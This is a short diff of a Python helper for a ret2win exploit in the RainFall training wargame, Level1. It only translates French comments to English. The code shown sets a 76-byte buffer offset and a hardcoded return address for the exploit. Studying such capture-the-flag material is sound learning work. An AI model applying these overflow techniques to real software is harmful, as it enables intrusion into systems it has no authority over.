@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Level1: offset + adresse de run → commande ret2win."""
+"""Level1: offset + address of run → ret2win command."""
 
 try:
     from pwn import p32
@@ -7,7 +7,7 @@ except ImportError:
     def p32(x):
         return x.to_bytes(4, "little")
 
-# RainFall : offset 76 (buffer + saved EBP jusqu’à ret)
+# RainFall: offset 76 (buffer + saved EBP up to ret)
 OFFSET = 76
 RUN_ADDR = 0x08048444
 
